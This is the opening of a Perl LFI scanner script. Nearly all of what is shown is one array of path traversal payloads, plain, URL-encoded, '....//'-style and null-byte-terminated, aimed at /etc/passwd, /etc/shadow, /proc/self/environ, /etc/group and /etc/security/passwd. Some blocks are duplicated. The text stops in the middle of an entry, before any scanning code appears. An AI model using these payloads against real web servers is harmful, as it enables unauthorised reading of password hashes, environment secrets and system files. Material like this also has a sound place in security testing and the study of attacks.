#!/usr/bin/perl
use LWP::Simple;
use Getopt::Long;
use Term::ANSIColor qw(:constants);



### ALL PATH / SCRIPT FOR SCANNING ###
@LFI =("/etc/passwd",
"../etc/passwd",
"../../etc/passwd",
"../../../etc/passwd",
"../../../../etc/passwd",
"../../../../../etc/passwd",
"../../../../../../etc/passwd",
"../../../../../../../etc/passwd",
"../../../../../../../../etc/passwd",
"../../../../../../../../../etc/passwd",
"../../../../../../../../../../etc/passwd",
"/etc/passwd%00",
"../etc/passwd%00",
"../../etc/passwd%00",
"../../../etc/passwd%00",
"../../../../etc/passwd%00",
"../../../../../etc/passwd%00",
"../../../../../../etc/passwd%00",
"../../../../../../../etc/passwd%00",
"../../../../../../../../etc/passwd%00",
"../../../../../../../../../etc/passwd%00",
"../../../../../../../../../../etc/passwd%00",
"....//etc/passwd",
"....//....//etc/passwd",
"....//....//....//etc/passwd",
"....//....//....//....//etc/passwd",
"....//....//....//....//....//etc/passwd",
"....//....//....//....//....//....//etc/passwd",
"....//....//....//....//....//....//....//etc/passwd",
"....//....//....//....//....//....//....//....//etc/passwd",
"....//....//....//....//....//....//....//....//....//etc/passwd",
"....//....//....//....//....//....//....//....//....//....//etc/passwd",
"....//etc/passwd%00",
"....//....//etc/passwd%00",
"....//....//....//etc/passwd%00",
"....//....//....//....//etc/passwd%00",
"....//....//....//....//....//etc/passwd%00",
"....//....//....//....//....//....//etc/passwd%00",
"....//....//....//....//....//....//....//etc/passwd%00",
"....//....//....//....//....//....//....//....//etc/passwd%00",
"....//....//....//....//....//....//....//....//....//etc/passwd%00",
"....//....//....//....//....//....//....//....//....//....//etc/passwd%00",
"%2Fetc%2Fpasswd",
"..%2Fetc%2Fpasswd",
"..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
"%2Fetc%2Fpasswd%00",
"..%2Fetc%2Fpasswd%00",
"..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00",
"....%2f%2Fetc/passwd",
"....%2f%2F....%2f%2Fetc/passwd",
"....%2f%2F....%2f%2F....%2f%2Fetc/passwd",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd",
"....%2f%2Fetc/passwd%00",
"....%2f%2F....%2f%2Fetc/passwd%00",
"....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/passwd%00",
"/proc/self/environ",
"../proc/self/environ",
"../../proc/self/environ",
"../../../proc/self/environ",
"../../../../proc/self/environ",
"../../../../../proc/self/environ",
"../../../../../../proc/self/environ",
"../../../../../../../proc/self/environ",
"../../../../../../../../proc/self/environ",
"../../../../../../../../../proc/self/environ",
"../../../../../../../../../../proc/self/environ",
"/proc/self/environ%00",
"../proc/self/environ%00",
"../../proc/self/environ%00",
"../../../proc/self/environ%00",
"../../../../proc/self/environ%00",
"../../../../../proc/self/environ%00",
"../../../../../../proc/self/environ%00",
"../../../../../../../proc/self/environ%00",
"../../../../../../../../proc/self/environ%00",
"../../../../../../../../../proc/self/environ%00",
"../../../../../../../../../../proc/self/environ%00",
"%2Fproc%2Fself%2Fenviron",
"..%2Fproc%2Fself%2Fenviron",
"..%2F..%2Fproc%2Fself%2Fenviron",
"..%2F..%2F..%2Fproc%2Fself%2Fenviron",
"..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron",
"..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron",
"..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron",
"%2Fproc%2Fself%2Fenviron%00",
"..%2Fproc%2Fself%2Fenviron%00",
"..%2F..%2Fproc%2Fself%2Fenviron%00",
"..%2F..%2F..%2Fproc%2Fself%2Fenviron%00",
"..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00",
"..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00",
"..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00",
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron%00",
"//proc/self/environ",
"....//proc/self/environ",
"....//....//proc/self/environ",
"....//....//....//proc/self/environ",
"....//....//....//....//proc/self/environ",
"....//....//....//....//....//proc/self/environ",
"....//....//....//....//....//....//proc/self/environ",
"....//....//....//....//....//....//....//proc/self/environ",
"....//....//....//....//....//....//....//....//proc/self/environ",
"....//....//....//....//....//....//....//....//....//proc/self/environ",
"....//....//....//....//....//....//....//....//....//....//proc/self/environ",
"//proc/self/environ%00",
"....//proc/self/environ%00",
"....//....//proc/self/environ%00",
"....//....//....//proc/self/environ%00",
"....//....//....//....//proc/self/environ%00",
"....//....//....//....//....//proc/self/environ%00",
"....//....//....//....//....//....//proc/self/environ%00",
"....//....//....//....//....//....//....//proc/self/environ%00",
"....//....//....//....//....//....//....//....//proc/self/environ%00",
"....//....//....//....//....//....//....//....//....//proc/self/environ%00",
"....//....//....//....//....//....//....//....//....//....//proc/self/environ%00",
"%2f%2Fproc/self/environ",
"....%2f%2Fproc/self/environ",
"....%2f%2F....%2f%2Fproc/self/environ",
"....%2f%2F....%2f%2F....%2f%2Fproc/self/environ",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ",
"%2f%2Fproc/self/environ%00",
"....%2f%2Fproc/self/environ%00",
"....%2f%2F....%2f%2Fproc/self/environ%00",
"....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00",
"....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fproc/self/environ%00","/etc/shadow","../etc/shadow","../../etc/shadow","../../../etc/shadow","../../../../etc/shadow","../../../../../etc/shadow","../../../../../../etc/shadow","../../../../../../../etc/shadow","../../../../../../../../etc/shadow","../../../../../../../../../etc/shadow","../../../../../../../../../../etc/shadow","/etc/shadow%00","../etc/shadow%00","../../etc/shadow%00","../../../etc/shadow%00","../../../../etc/shadow%00","../../../../../etc/shadow%00","../../../../../../etc/shadow%00","../../../../../../../etc/shadow%00","../../../../../../../../etc/shadow%00","../../../../../../../../../etc/shadow%00","../../../../../../../../../../etc/shadow%00","%2Fetc..%2Fshadow","..%2Fetc%2Fshadow","..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow","%2Fetc..%2Fshadow%00","..%2Fetc%2Fshadow%00","..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00","%2F%2Fetc/shadow","....%2f%2Fetc/shadow","....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow","%2F%2Fetc/shadow%00","....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2F....%2f%2Fetc/shadow%00","....//etc/shadow","....//....//etc/shadow","....//....//....//etc/shadow","....//....//....//....//etc/shadow","....//....//....//....//....//etc/shadow","....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//etc/shadow","....//....//....//....//....//....//....//....//....//....//etc/shadow","....//etc/shadow%00","....//....//etc/shadow%00","....//....//....//etc/shadow%00","....//....//....//....//etc/shadow%00","....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//etc/shadow%00","....//....//....//....//....//....//....//....//....//....//etc/shadow%00","/etc/group","../etc/group","../../etc/group","../../../etc/group","../../../../etc/group","../../../../../etc/group","../../../../../../etc/group","../../../../../../../etc/group","../../../../../../../../etc/group","../../../../../../../../../etc/group","../../../../../../../../../../etc/group","/etc/group%00","../etc/group%00","../../etc/group%00","../../../etc/group%00","../../../../etc/group%00","../../../../../etc/group%00","../../../../../../etc/group%00","../../../../../../../etc/group%00","../../../../../../../../etc/group%00","../../../../../../../../../etc/group%00","../../../../../../../../../../etc/group%00","%2Fetc..%2Fgroup","..%2Fetc%2Fgroup","..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","%2Fetc%2Fgroup%00","..%2Fetc%2Fgroup%00","..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","%2F%2Fetc/group","....%2F%2Fetc/group","....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","/etc/group%00","....%2F%2Fetc/group%00","....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","//etc/group","....//etc/group","....//....//etc/group","....//....//....//etc/group","....//....//....//....//etc/group","....//....//....//....//....//etc/group","....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//....//etc/group","//etc/group%00","....//etc/group%00","....//....//etc/group%00","....//....//....//etc/group%00","....//....//....//....//etc/group%00","....//....//....//....//....//etc/group%00","....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//....//etc/group%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//